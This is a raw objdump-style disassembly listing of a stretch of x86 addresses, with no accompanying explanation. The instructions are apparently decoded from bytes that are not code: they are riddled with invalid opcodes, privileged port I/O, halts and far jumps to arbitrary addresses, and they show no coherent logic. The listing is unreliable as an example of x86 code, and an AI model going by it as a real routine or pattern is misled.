  420242:	cmp    BYTE PTR [eax-0x346e6695],dh
  420248:	cwde   
  420249:	inc    BYTE PTR [edi+0x64]
  42024c:	or     al,0x5a
  42024e:	shl    DWORD PTR ds:[esi],1
  420251:	and    bl,BYTE PTR [esi]
  420253:	int    0x83
  420255:	jae    0x4202ce
  420257:	jnp    0x42028d
  420259:	cmp    eax,0xe1179159
  42025e:	nop
  42025f:	loope  0x420277
  420261:	fwait
  420262:	mov    WORD PTR [edx+0x1607d8e1],?
  420268:	push   ds
  420269:	inc    esp
  42026a:	sub    ecx,ecx
  42026c:	js     0x42029b
  42026e:	inc    ebx
  42026f:	add    BYTE PTR [ebx+ebp*8],al
  420272:	fsubr  st(6),st
  420274:	pop    edx
  420275:	add    ch,BYTE PTR [ebx]
  420277:	cmc    
  420278:	sbb    eax,DWORD PTR [ebx]
  42027a:	pop    esp
  42027b:	add    ah,cl
  42027d:	loope  0x420295
  42027f:	enter  0xb3e4,0x35
  420283:	xchg   edx,eax
  420284:	xor    bl,BYTE PTR [edx-0x1bdb5bdb]
  42028a:	imul   ebp,DWORD PTR [edi],0x59cde1b6
  420290:	fsub   QWORD PTR [edi-0x60]
  420293:	ror    ebx,1
  420295:	xchg   ecx,eax
  420296:	sub    al,0x50
  420298:	lds    ecx,FWORD PTR [esi-0x2d]
  42029b:	mov    ebp,0x80b0d7f9
  4202a0:	ret    0x3db6
  4202a3:	and    al,0x80
  4202a5:	inc    edi
  4202a6:	mov    eax,ds:0x63d0c12f
  4202ab:	dec    edi
  4202ac:	fwait
  4202ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ae:	and    edi,DWORD PTR [ebp+0x23c3012b]
  4202b4:	xchg   edx,eax
  4202b5:	jb     0x4202cc
  4202b7:	dec    eax
  4202b8:	mov    al,0x9a
  4202ba:	push   ecx
  4202bb:	jmp    0x33ce:0x198c3633
  4202c2:	jp     0x4202c9
  4202c4:	fdivrp st(6),st
  4202c6:	(bad)  
  4202c7:	push   edx
  4202c8:	(bad)  
  4202c9:	and    esi,DWORD PTR [eax]
  4202cb:	stos   DWORD PTR es:[edi],eax
  4202cc:	push   ss
  4202cd:	cmp    al,0xd5
  4202cf:	push   eax
  4202d0:	daa    
  4202d1:	xlat   BYTE PTR ds:[ebx]
  4202d2:	push   edi
  4202d3:	jno    0x420319
  4202d5:	popa   
  4202d6:	mov    ds:0x525a946f,eax
  4202db:	pop    es
  4202dc:	(bad)  
  4202dd:	hlt    
  4202de:	js     0x4202c8
  4202e0:	ror    BYTE PTR [edi],1
  4202e2:	pop    ds
  4202e3:	sbb    cl,bh
  4202e5:	mov    ebx,0x5ba98895
  4202ea:	cdq    
  4202eb:	xor    al,0xc
  4202ed:	ins    BYTE PTR es:[edi],dx
  4202ee:	push   edx
  4202ef:	sbb    al,0x5d
  4202f1:	lahf   
  4202f2:	into   
  4202f3:	test   al,0x1f
  4202f5:	jg     0x420308
  4202f7:	inc    ebp
  4202f8:	xor    BYTE PTR [eax-0x786338c2],ch
  4202fe:	cmp    dl,BYTE PTR [eax-0x57b7469b]
  420304:	int    0xf4
  420306:	rcr    DWORD PTR [esi+0x20391671],1
  42030c:	lds    ecx,FWORD PTR [ebp+0x1a]
  42030f:	bound  esi,QWORD PTR [esp+ebp*8]
  420312:	xchg   DWORD PTR [edx+0x6e88a939],edi
  420318:	mov    esp,0x221b989
  42031d:	inc    ebx
  42031e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42031f:	fs loop 0x42038e
  420322:	adc    eax,0x700582f2
  420328:	add    ch,ch
  42032a:	sub    al,0xbf
  42032c:	arpl   WORD PTR [ebx+edx*1],bp
  42032f:	push   ebp
  420330:	es jbe 0x420358
  420333:	cmp    al,0x7e
  420335:	sub    bh,ch
  420337:	ret    0xceac
  42033a:	sbb    al,0xf8
  42033c:	mov    ah,0x10
  42033e:	and    BYTE PTR [edx+0x3e9871bd],0x71
  420345:	xchg   edi,eax
  420346:	sub    DWORD PTR [edx],0xfffffffa
  420349:	inc    esp
  42034a:	add    edi,DWORD PTR [edx+eiz*2+0x26108639]
  420351:	imul   eax,DWORD PTR [ebx],0x2a885caf
  420357:	les    ebp,FWORD PTR [edx+0x1d]
  42035a:	dec    eax
  42035b:	push   ds
  42035c:	mov    edx,0x2b2cb5dd
  420361:	xchg   DWORD PTR [ebx],ebp
  420363:	add    BYTE PTR [edi-0x6a],al
  420366:	mov    esi,0x756d05c7
  42036b:	aas    
  42036c:	jp     0x4203d8
  42036e:	mov    edx,0x4ac661c6
  420373:	data16 mov dl,0x94
  420376:	aad    0xa6
  420378:	aam    0x54
  42037a:	jns    0x42035d
  42037c:	out    dx,eax
  42037d:	add    al,0xce
  42037f:	arpl   WORD PTR [ebx],dx
  420381:	mov    es,WORD PTR [edi]
  420383:	adc    al,0x6
  420385:	adc    ah,BYTE PTR [eax+0x62]
  420388:	xchg   edx,eax
  420389:	sub    al,0x62
  42038b:	mov    ah,BYTE PTR [eax]
  42038d:	mov    fs,WORD PTR [edx-0x7083d441]
  420393:	mov    ch,BYTE PTR [ebp-0x2b]
  420396:	adc    al,0xbf
  420398:	push   ebx
  420399:	fdiv   DWORD PTR [eiz*1-0x3e978331]
  4203a0:	hlt    
  4203a1:	dec    eax
  4203a2:	jnp    0x420391
  4203a4:	or     al,0x56
  4203a6:	shl    al,1
  4203a8:	repz inc edx
  4203aa:	mov    ecx,0xc2927eec
  4203af:	jo     0x42035a
  4203b1:	ficom  DWORD PTR [esp+eax*2]
  4203b4:	icebp  
  4203b5:	(bad)  
  4203b6:	push   0xffffffc1
  4203b8:	inc    esi
  4203b9:	jo     0x420357
  4203bb:	sub    BYTE PTR [esi+0x45],dh
  4203be:	xchg   edi,eax
  4203bf:	out    0x3d,al
  4203c1:	stc    
  4203c2:	push   ebx
  4203c3:	mov    dl,0xb7
  4203c5:	jmp    0x2b8f779c
  4203ca:	cmovs  edi,DWORD PTR [ebx+0x6f2b5d5a]
  4203d1:	push   edi
  4203d2:	mov    DWORD PTR [edx+0x3c],0x76f446d5
  4203d9:	pop    edi
  4203da:	pop    ss
  4203db:	and    edx,DWORD PTR [edi-0x6a1fa754]
  4203e1:	push   esp
  4203e2:	push   si
  4203e4:	fisub  WORD PTR [ecx+0xcddad2a]
  4203ea:	sar    DWORD PTR [esi-0x39d08848],0x6f
  4203f1:	sub    al,0x45
  4203f3:	gs jne 0x4203aa
  4203f6:	fwait
  4203f7:	jecxz  0x42038a
  4203f9:	dec    eax
  4203fa:	mov    edx,0xeb033e9d
  4203ff:	sub    dh,bh
  420401:	stos   DWORD PTR es:[edi],eax
  420402:	in     eax,0x1
  420404:	cmp    edi,ecx
  420406:	nop
  420407:	adc    DWORD PTR [edx-0x53],0x7f
  42040b:	mov    al,ds:0xf8e6fb86
  420410:	inc    esi
  420411:	out    0x48,al
  420413:	scas   al,BYTE PTR es:[edi]
  420414:	cmp    al,0x2f
  420416:	int    0xc5
  420418:	cdq    
  420419:	add    BYTE PTR [ecx+0x2299a493],bl
  42041f:	add    BYTE PTR [ebp+0x26],ah
  420422:	xor    eax,0x2f09a2ad
  420427:	jmp    0x4203c3
  420429:	out    dx,al
  42042a:	rcl    BYTE PTR [esi],1
  42042c:	dec    esi
  42042d:	jae    0x42041a
  42042f:	sub    al,0x7d
  420431:	mov    bl,0xe7
  420433:	dec    BYTE PTR ds:0xf2eaf0ae
  420439:	stos   BYTE PTR es:[edi],al
  42043a:	mov    esp,0x686bd2d9
  42043f:	pop    ecx
  420440:	mov    ebp,0x72fc6960
  420445:	mov    esp,0x2135aced
  42044a:	test   eax,0x1e64b298
  42044f:	adc    DWORD PTR [ebx],eax
  420451:	pop    ebp
  420452:	jnp    0x420450
  420454:	ins    DWORD PTR es:[edi],dx
  420455:	push   es
  420456:	xchg   ebx,eax
  420457:	jg     0x42043c
  420459:	nop
  42045a:	mov    ch,0x29
  42045c:	into   
  42045d:	mov    DWORD PTR ds:0x27108375,edi
  420463:	xlat   BYTE PTR ds:[ebx]
  420464:	jb     0x420478
  420466:	adc    ah,bl
  420468:	mov    esp,0x16214376
  42046d:	fcmovb st,st(0)
  42046f:	cmp    dl,BYTE PTR [ebx-0x67]
  420472:	daa    
  420473:	mov    ds:0xbe1e9a7e,eax
  420478:	outs   dx,BYTE PTR ds:[esi]
  420479:	push   0x5b
  42047b:	stos   BYTE PTR es:[edi],al
  42047c:	ins    BYTE PTR es:[edi],dx
  42047d:	mov    ds:0x33b71198,al
  420482:	loope  0x4204bb
  420484:	in     al,dx
  420485:	pop    es
  420486:	retf   
  420487:	xchg   al,dh
  420489:	inc    edx
  42048a:	mov    dh,0x16
  42048c:	mov    ds:0x4027e2d7,eax
  420491:	iret   
  420492:	nop
  420493:	or     eax,0xe8b5f5bb
  420498:	sti    
  420499:	mov    edx,0x32ceb94e
  42049e:	jo     0x4204c1
  4204a0:	push   es
  4204a1:	dec    bx
  4204a3:	stos   DWORD PTR es:[edi],eax
  4204a4:	mov    ah,0xbf
  4204a6:	add    edx,0xa93ca2bb
  4204ac:	rol    DWORD PTR [eax-0x4],1
  4204af:	pop    ecx
  4204b0:	dec    ebp
  4204b1:	inc    eax
  4204b2:	and    DWORD PTR [esi],0x3cade49f
  4204b8:	and    bl,BYTE PTR [eax+0x47]
  4204bb:	aad    0xb2
  4204bd:	cmp    eax,0x4292ac92
  4204c2:	mov    DWORD PTR [edx+0x49],ebp
  4204c5:	stc    
  4204c6:	add    DWORD PTR [ecx+0x272ef201],esp
  4204cc:	(bad)  
  4204cd:	push   ebx
  4204ce:	xchg   ebx,eax
  4204cf:	loopne 0x4204b9
  4204d1:	xor    ebx,DWORD PTR [edx+edx*4-0x76e33e35]
  4204d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204d9:	retf   
  4204da:	test   DWORD PTR ss:[edi+0x4eb90e34],eax
  4204e1:	adc    BYTE PTR ds:0x96b25e0d,ch
  4204e7:	test   DWORD PTR [edi],0x8402c521
  4204ed:	stos   DWORD PTR es:[edi],eax
  4204ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ef:	xchg   DWORD PTR [edi],edx
  4204f1:	pop    esp
  4204f2:	ret    0xfcb
  4204f5:	pushf  
  4204f6:	data16 in al,dx
  4204f8:	je     0x420502
  4204fa:	add    eax,0x43d2b11
  4204ff:	push   eax
  420500:	lods   eax,DWORD PTR ds:[esi]
  420501:	lds    eax,FWORD PTR [ebx-0x5cb3ba49]
  420507:	or     BYTE PTR [ecx+0x30],0x41
  42050b:	js     0x420572
  42050d:	jno    0x4204cd
  42050f:	pop    ecx
  420510:	js     0x420560
  420512:	je     0x42051b
  420514:	test   eax,0xeb9c8e83
  420519:	(bad)  
  42051a:	rol    BYTE PTR [esi+0x3be13af6],cl
  420520:	sbb    eax,0x4080e5a3
  420525:	mov    ebx,0x63506fd6
  42052a:	hlt    
  42052b:	adc    DWORD PTR ds:0xd57ab434,ebx
  420531:	xchg   DWORD PTR [eax+esi*4-0x32f8cb1a],edi
  420538:	cwde   
  420539:	popa   
  42053a:	jo     0x42051e
  42053c:	int    0x8
  42053e:	and    eax,edi
  420540:	cmp    al,0xa3
  420542:	cli    
  420543:	jno    0x4205c3
  420545:	test   al,0x0
  420547:	stos   DWORD PTR es:[edi],eax
  420548:	mov    ebx,0xf3b74c80
  42054d:	mov    al,0x47
  42054f:	jne    0x4205a8
  420551:	mov    ebp,0xc28446af
  420556:	imul   esp,DWORD PTR [ebx+0xfa3e061],0x20be9f6
  420560:	mov    al,ds:0x3ed20349
  420565:	push   cs
  420566:	pop    edi
  420567:	push   0xc25ab5e9
  42056c:	mov    bl,0x82
  42056e:	in     eax,dx
  42056f:	div    DWORD PTR [ecx]
  420571:	lds    edx,FWORD PTR [ebx-0x7bf74e4e]
  420577:	aam    0xeb
  420579:	sub    ecx,0xce249643
  42057f:	sub    BYTE PTR [ebx+0x54],ch
  420582:	mov    eax,ds:0x22b3feb9
  420587:	outs   dx,DWORD PTR ds:[esi]
  420588:	add    al,dh
  42058a:	dec    eax
  42058b:	shl    al,1
  42058d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058e:	mov    al,BYTE PTR [eax-0x23]
  420591:	sar    BYTE PTR [ebp+0x42],0x5f
  420595:	mov    ds:0xf290447,eax
  42059a:	inc    eax
  42059b:	sbb    BYTE PTR [edi-0x14],bh
  42059e:	mov    DWORD PTR [esi],ecx
  4205a0:	sbb    ebp,DWORD PTR [ebx+eax*4]
  4205a3:	push   eax
  4205a4:	jne    0x420537
  4205a6:	cmp    BYTE PTR [ebx],dl
  4205a8:	inc    ebx
  4205a9:	mov    al,ds:0x81b49552
  4205ae:	(bad)  
  4205af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b0:	inc    eax
  4205b1:	add    ch,cl
  4205b3:	inc    edi
  4205b4:	pop    edx
  4205b5:	push   es
  4205b6:	addr16 jge 0x4205e5
  4205b9:	dec    edi
  4205ba:	jnp    0x4205b8
  4205bc:	hlt    
  4205bd:	add    BYTE PTR [ebp+ebx*2-0x1d3e004b],ch
  4205c4:	fs pop edx
  4205c6:	or     DWORD PTR ds:0xb0e8267,ebx
  4205cc:	loope  0x4205c4
  4205ce:	mov    ds:0x293df536,eax
  4205d3:	lock rol edx,cl
  4205d6:	repz lahf 
  4205d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205d9:	mov    edx,0x827bb340
  4205de:	mov    dh,0x9d
  4205e0:	popa   
  4205e1:	mov    al,ds:0xf273898f
  4205e6:	or     eax,0x73979bc5
  4205eb:	pop    edi
  4205ec:	sub    eax,0xc5fa9467
  4205f1:	pop    edi
  4205f2:	ds push eax
  4205f4:	push   esi
  4205f5:	test   eax,0x459504a
  4205fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205fb:	or     eax,ebx
  4205fd:	fwait
  4205fe:	pop    edi
  4205ff:	imul   ecx,DWORD PTR [edx+0x6c],0xd74eda92
  420606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420607:	xor    BYTE PTR [ebx-0x2f7201d1],dh
  42060d:	pop    es
  42060e:	or     eax,0x116f02d4
  420613:	dec    esi
  420614:	imul   ebp,DWORD PTR [esi],0xffffffe7
  420617:	pop    esp
  420618:	lods   al,BYTE PTR ds:[esi]
  420619:	mov    bh,0xd9
  42061b:	push   ss
  42061c:	cs in  al,dx
  42061e:	cmp    cl,dh
  420620:	mov    cl,BYTE PTR [eax]
  420622:	jg     0x420661
  420624:	mov    edx,0xfc7f423c
  420629:	jle    0x420652
  42062b:	js     0x4206a4
  42062d:	dec    esi
  42062e:	pop    ss
  42062f:	and    al,0xf8
  420631:	gs aas 
  420633:	rcpps  xmm7,xmm4
  420636:	fs push edx
  420638:	push   ebx
  420639:	jae    0x4205ce
  42063b:	jnp    0x4206ae
  42063d:	neg    DWORD PTR [ecx]
  42063f:	je     0x42063f
  420641:	mov    bh,0xcf
  420643:	mov    bl,0x63
  420645:	or     DWORD PTR [ebp+0x63c5218d],esi
  42064b:	pop    edi
  42064c:	add    al,0x6c
  42064e:	cmc    
  42064f:	jne    0x420683
  420651:	push   eax
  420652:	imul   esp,DWORD PTR [edx+0x3b673b9f],0x8
  420659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42065a:	in     al,0x30
  42065c:	rcpps  xmm4,XMMWORD PTR [eax]
  42065f:	mov    al,0xbe
  420661:	mov    WORD PTR [ebx+0x7],?
  420664:	and    eax,DWORD PTR [edi+0x34]
  420667:	and    cl,BYTE PTR [ebp+0x3ca9c696]
  42066d:	xchg   esp,eax
  42066e:	pushf  
  42066f:	ret    0x53cc
  420672:	cwde   
  420673:	ret    
  420674:	push   ebp
  420675:	lods   eax,DWORD PTR ds:[esi]
  420676:	leave  
  420677:	in     eax,0x31
  420679:	jns    0x4206dc
  42067b:	push   ebp
  42067c:	xor    DWORD PTR [edx],ecx
  42067e:	sbb    DWORD PTR [ecx+0x743dfa3],0xecd1c94c
  420688:	(bad)  
  420689:	mov    eax,ds:0x28a02547
  42068e:	sub    eax,DWORD PTR [ebp+0x3c]
  420691:	push   cs
  420692:	sub    ah,0x97
  420695:	and    dh,BYTE PTR [eax-0x52]
  420698:	stos   BYTE PTR es:[edi],al
  420699:	jns    0x420679
  42069b:	test   eax,0x47254be7
  4206a0:	jp     0x42062d
  4206a2:	jb     0x42066f
  4206a4:	loopne 0x4206af
  4206a6:	xor    DWORD PTR [esi],0x51
  4206a9:	repnz push edx
  4206ab:	shl    DWORD PTR [esi-0x2d],cl
  4206ae:	dec    edi
  4206af:	(bad)  fs:[esi+ecx*4]
  4206b3:	xchg   DWORD PTR [eax-0x10],esi
  4206b6:	ins    DWORD PTR es:[edi],dx
  4206b7:	inc    ebx
  4206b8:	clc    
  4206b9:	mov    ah,0x42
  4206bb:	jne    0x420719
  4206bd:	cmp    BYTE PTR [edx],dh
  4206bf:	call   0xd83444f3
  4206c4:	into   
  4206c5:	es pop ss
  4206c7:	pushf  
  4206c8:	fidiv  DWORD PTR [ebp+0x3c]
  4206cb:	or     ebp,DWORD PTR [ecx-0x698889ca]
  4206d1:	rol    BYTE PTR [ebx],1
  4206d3:	inc    ebx
  4206d4:	or     BYTE PTR [ecx],ah
  4206d6:	rcl    ah,0xb2
  4206d9:	fst    st(1)
  4206db:	in     eax,dx
  4206dc:	and    eax,0x463b9e3d
  4206e1:	jge    0x42074f
  4206e3:	sub    dh,dh
  4206e5:	ds js  0x4206ba
  4206e8:	mov    ebp,0x52aad1a4
  4206ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ee:	frndint 
  4206f0:	cmc    
  4206f1:	je     0x4206a6
  4206f3:	psrlq  mm1,QWORD PTR [edx+0x60]
  4206f7:	cmp    esp,DWORD PTR [ecx+0x2d52b1cd]
  4206fd:	inc    edx
  4206fe:	mov    bl,0x75
  420700:	mov    bl,BYTE PTR [esi+0x711ab293]
  420706:	ins    BYTE PTR es:[edi],dx
  420707:	scas   al,BYTE PTR es:[edi]
  420708:	sbb    al,0x2c
  42070a:	or     BYTE PTR [ecx-0x27e203d8],al
  420710:	mov    ebx,0x96224fa0
  420715:	mov    eax,0xc8fa2571
  42071a:	sub    eax,0xccd554cb
  42071f:	xor    BYTE PTR [edx],dh
  420721:	add    DWORD PTR [ebp+0x4d],0xcd108843
  420728:	popf   
  420729:	mov    al,0xc8
  42072b:	push   ebx
  42072c:	aaa    
  42072d:	xchg   esp,eax
  42072e:	pop    edi
  42072f:	mov    DWORD PTR [edi-0x17dd7a7c],esp
  420735:	xchg   ebx,eax
  420736:	ds mov eax,0x4e43738
  42073c:	ins    BYTE PTR es:[edi],dx
  42073d:	and    BYTE PTR [ebx-0x10256fad],ch
  420743:	jns    0x42070d
  420745:	xor    DWORD PTR [edx*8+0x1675b752],ecx
  42074c:	xor    bh,0xc9
  42074f:	test   eax,0x86003b92
  420754:	ja     0x420720
  420756:	test   BYTE PTR [ecx-0x33],al
  420759:	retf   
  42075a:	int3   
  42075b:	aaa    
  42075c:	jge    0x420772
  42075e:	and    al,al
  420760:	sbb    al,0xcb
  420762:	mov    al,0xf2
  420764:	aam    0x6b
  420766:	std    
  420767:	mov    bl,0xd9
  420769:	scas   eax,DWORD PTR es:[edi]
  42076a:	fs xor al,0x80
  42076d:	adc    eax,0x56ed217f
  420772:	xchg   esp,eax
  420773:	(bad)  
  420774:	scas   eax,DWORD PTR es:[edi]
  420775:	lods   al,BYTE PTR ds:[esi]
  420776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420777:	pop    esp
  420778:	data16 mov WORD PTR ds:0x3f85727b,ds
  42077f:	jbe    0x420714
  420781:	sbb    ah,BYTE PTR [ecx+0x4cc39c01]
  420787:	inc    esi
  420788:	add    BYTE PTR [ebp-0x22],0x40
  42078c:	fwait
  42078d:	repz mov edi,0x5a3a3a72
  420793:	into   
  420794:	popa   
  420795:	into   
  420796:	sub    eax,0x30af5383
  42079b:	fcomp  st(4)
  42079d:	sti    
  42079e:	and    eax,DWORD PTR [edi+0x74dbef91]
  4207a4:	mov    ebx,0xea9bd9e4
  4207a9:	dec    edx
  4207aa:	pop    ebx
  4207ab:	jge    0x420823
  4207ad:	fwait
  4207ae:	mov    al,0x5b
  4207b0:	(bad)  
  4207b1:	stc    
  4207b2:	xchg   ecx,eax
  4207b3:	cdq    
  4207b4:	lea    esi,[edi+0x40]
  4207b7:	iret   
  4207b8:	add    DWORD PTR ds:0xaf43b5ed,edx
  4207be:	inc    di
  4207c0:	mov    ebp,0x546f7a21
  4207c5:	xchg   BYTE PTR [esi],ah
  4207c7:	je     0x4207b0
  4207c9:	psllw  mm5,QWORD PTR [eax]
  4207cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207cd:	lds    edx,FWORD PTR [ebx-0x63d161c3]
  4207d3:	or     bh,cl
  4207d5:	inc    ebp
  4207d6:	lods   eax,DWORD PTR ds:[esi]
  4207d7:	cwde   
  4207d8:	xchg   esp,eax
  4207d9:	mov    cl,0xae
  4207db:	ja     0x420810
  4207dd:	call   0xf45e:0x8772ae4c
  4207e4:	ret    0xa7c8
  4207e7:	hlt    
  4207e8:	mov    cl,0x1
  4207ea:	stc    
  4207eb:	and    al,0xe
  4207ed:	push   ebp
  4207ee:	leave  
  4207ef:	imul   eax,DWORD PTR [edi+0xc],0xffffffe8
  4207f3:	es test al,0x3b
  4207f6:	xchg   ecx,eax
  4207f7:	test   al,0x12
  4207f9:	mov    edi,0xf02eac25
  4207fe:	sbb    DWORD PTR [eax-0x15a42a1c],edi
  420804:	ret    
  420805:	inc    ebp
  420806:	test   al,0x1a
  420808:	in     al,0x9c
  42080a:	into   
  42080b:	fsub   st,st(7)
  42080d:	gs xchg esi,eax
  42080f:	mov    eax,0x79e2bfb1
  420814:	pop    ebx
  420815:	std    
  420816:	cmc    
  420817:	into   
  420818:	fnstenv [eax]
  42081a:	scas   eax,DWORD PTR es:[edi]
  42081b:	jp     0x42088d
  42081d:	es push ss
  42081f:	xchg   esi,eax
  420820:	mov    DWORD PTR [ebx+0x583b504b],edx
  420826:	push   ecx
  420827:	push   esi
  420828:	dec    dl
  42082a:	popa   
  42082b:	ja     0x4208a5
  42082d:	into   
  42082e:	xchg   ecx,eax
  42082f:	jnp    0x4207b2
  420831:	mov    edx,0xdb9067b
  420837:	pop    esi
  420838:	aad    0x1
  42083a:	stc    
  42083b:	adc    edx,ebx
  42083d:	fdivr  QWORD PTR [ebp+0x380bb426]
  420843:	push   0x27a8c867
  420848:	jns    0x42082d
  42084a:	mov    ds:0xfd5add12,eax
  42084f:	mov    BYTE PTR [eax+0x31],al
  420852:	mov    dh,0x22
  420854:	out    dx,al
  420855:	mov    eax,0x372ecf09
  42085a:	loope  0x4207e0
  42085c:	ins    BYTE PTR es:[edi],dx
  42085d:	or     eax,0x9d8e9cfe
  420862:	sub    DWORD PTR [edi],esp
  420864:	mov    ds:0xeb144613,al
  420869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42086a:	adc    BYTE PTR [esi-0x3b1b83ee],0xa0
  420871:	call   0x213bedeb
  420876:	cmp    DWORD PTR [esi],ebp
  420878:	push   ds
  420879:	push   esp
  42087a:	inc    esi
  42087b:	(bad)  
  42087c:	adc    ebx,DWORD PTR [ebx-0x3feea02e]
  420882:	(bad)  
  420883:	sbb    al,0xe6
  420885:	mov    ebp,0x2f38bc07
  42088a:	or     ecx,DWORD PTR [ebx-0x57f5f282]
  420890:	and    esi,ecx
  420892:	test   DWORD PTR ds:0xf943242b,0xeebc1f33
  42089c:	xlat   BYTE PTR cs:[ebx]
  42089e:	xor    BYTE PTR [edx+0x30],dl
  4208a1:	xor    ah,BYTE PTR [ebx+eax*4-0x15]
  4208a5:	fstp   TBYTE PTR [ecx]
  4208a7:	out    dx,al
  4208a8:	out    0xfc,al
  4208aa:	cmp    eax,0xd34df31d
  4208af:	and    al,0xd2
  4208b1:	xchg   edx,eax
  4208b2:	push   eax
  4208b3:	dec    esp
  4208b4:	repz push edi
  4208b6:	and    dh,al
  4208b8:	data16 rcl BYTE PTR [esi+0x4e975f92],0x1c
  4208c0:	add    esp,edx
  4208c2:	jp     0x420925
  4208c4:	in     al,0x20
  4208c6:	add    DWORD PTR [eax+0x63],edx
  4208c9:	pop    esp
  4208ca:	ret    0xd019
  4208cd:	out    dx,eax
  4208ce:	add    DWORD PTR [edx-0x4f],eax
  4208d1:	xchg   ecx,eax
  4208d2:	arpl   WORD PTR [ebp+0x6],si
  4208d5:	sbb    BYTE PTR [ebx+edi*4-0x53],bl
  4208d9:	cdq    
  4208da:	cmp    DWORD PTR [eax+0x5e31e884],edi
  4208e0:	xchg   esp,eax
  4208e1:	xchg   BYTE PTR [eax],bl
  4208e3:	rcl    edi,cl
  4208e5:	call   0x7859ed4d
  4208ea:	mov    bh,0xf0
  4208ec:	sub    edx,DWORD PTR [ecx-0x5a]
  4208ef:	add    BYTE PTR [edi],dl
  4208f1:	mov    al,ds:0xe5802eef
  4208f6:	sar    BYTE PTR [ebx],0x85
  4208f9:	mov    cs,WORD PTR [ecx]
  4208fb:	inc    esp
  4208fc:	inc    esp
  4208fd:	std    
  4208fe:	ss mov edx,0x7d304977
  420904:	adc    DWORD PTR ds:0x658718f1,esi
  42090a:	jb     0x4208fb
  42090c:	push   ebp
  42090d:	inc    edi
  42090e:	push   es
  42090f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420910:	adc    eax,0xbfd934d9
  420915:	daa    
  420916:	xchg   edx,eax
  420917:	pop    ebx
  420919:	inc    esp
  42091a:	pop    eax
  42091b:	fisubr DWORD PTR [esi-0x7a]
  42091e:	xor    dh,0xea
  420921:	out    dx,al
  420922:	fcmovb st,st(7)
  420924:	(bad)  
  420925:	jns    0x4208f3
  420927:	jns    0x420959
  420929:	mov    dh,0xf2
  42092b:	cmp    DWORD PTR [ecx-0x2061e8c3],esp
  420931:	pop    esi
  420932:	cmp    BYTE PTR [ecx],dl
  420934:	dec    esi
  420935:	jne    0x420960
  420937:	mov    ch,0xef
  420939:	adc    ebp,esp
  42093b:	jmp    0x4208f0
  42093d:	mov    ds,WORD PTR [edi+0x7fc63bf6]
  420943:	stc    
  420944:	or     ch,dh
  420946:	mov    cl,0xe9
  420948:	xor    eax,DWORD PTR [esi+ebp*4]
  42094b:	inc    ebp
  42094c:	fdivr  DWORD PTR [ebp-0x60]
  42094f:	fimul  DWORD PTR [ebp-0x3f]
  420952:	imul   ebx,DWORD PTR ds:0xdc3bb04b,0xbf600bb6
  42095c:	push   ecx
  42095d:	shl    DWORD PTR [ebx+0x7f],cl
  420960:	imul   ecx,DWORD PTR [ebp+0x1a],0xffffff87
  420964:	leave  
  420965:	mov    edi,ebp
  420967:	es dec esp
  420969:	ror    eax,cl
  42096b:	inc    eax
  42096c:	mov    ch,0x3e
  42096e:	inc    ebx
  42096f:	sub    eax,0x26886f88
  420974:	icebp  
  420975:	dec    edi
  420976:	imul   esp,DWORD PTR [esp+esi*8+0xdd35994],0x2
  42097e:	xchg   ebx,eax
  42097f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420980:	mov    eax,0x5bbf9c48
  420985:	leave  
  420986:	fdivr  DWORD PTR [eax+edi*4+0x145df030]
  42098d:	and    DWORD PTR [edi+ebx*8+0x2aa2c7b3],edi
  420994:	lods   eax,DWORD PTR ds:[esi]
  420995:	lods   al,BYTE PTR ds:[esi]
  420996:	xchg   ebx,eax
  420997:	pop    ebx
  420998:	mov    eax,ds:0xe0580754
  42099d:	or     ah,BYTE PTR [eax+0x1d]
  4209a0:	mov    eax,ds:0xc6015fb7
  4209a5:	fist   DWORD PTR [esi+0x3901db15]
  4209ab:	xor    bl,BYTE PTR [edx+0x6b3ab9ae]
  4209b1:	sub    BYTE PTR [ebp-0x38c102fd],bl
  4209b7:	jmp    0xc378:0x4e9bb7cc
  4209be:	sbb    edx,DWORD PTR [edi-0x25adc017]
  4209c4:	inc    eax
  4209c5:	shl    DWORD PTR [edi+0x61],1
  4209c8:	pop    ds
  4209c9:	int    0xa3
  4209cb:	int    0xcd
  4209cd:	repz mov bh,0x36
  4209d0:	and    al,0x41
  4209d2:	fld    QWORD PTR fs:[eax-0x68b141fb]
  4209d9:	ins    BYTE PTR es:[edi],dx
  4209da:	mov    bh,0x43
  4209dd:	(bad)  
  4209df:	cdq    
  4209e0:	in     al,0x6b
  4209e2:	or     eax,0xee625d1b
  4209e7:	out    dx,al
  4209e8:	jbe    0x4209f0
  4209ea:	dec    esi
  4209eb:	dec    ebp
  4209ec:	fistp  WORD PTR [ecx]
  4209ee:	sbb    dh,al
  4209f0:	in     al,dx
  4209f1:	adc    DWORD PTR [ebx+eiz*1+0x4e323921],ecx
  4209f8:	(bad)  
  4209f9:	iret   
  4209fa:	clc    
  4209fb:	aas    
  4209fc:	jl     0x4209cf
  4209fe:	out    0x2d,eax
  420a00:	cmp    esi,DWORD PTR [edi+0x76]
  420a03:	in     al,dx
  420a04:	loope  0x4209cb
  420a06:	(bad)  
  420a07:	aad    0x7f
  420a09:	cmp    ecx,esi
  420a0b:	call   0x2c5b5306
  420a10:	es pop ecx
  420a12:	xchg   ebp,eax
  420a13:	add    BYTE PTR [ebp+0x7c],ch
  420a16:	and    BYTE PTR [esi+0x5],0x2
  420a1a:	inc    ebp
  420a1b:	mov    eax,0x920c1639
  420a20:	add    DWORD PTR [ecx],ebx
  420a22:	scas   al,BYTE PTR es:[edi]
  420a23:	sbb    ch,ch
  420a25:	jmp    0x203d836
  420a2a:	call   0x9893:0xc4d1772e
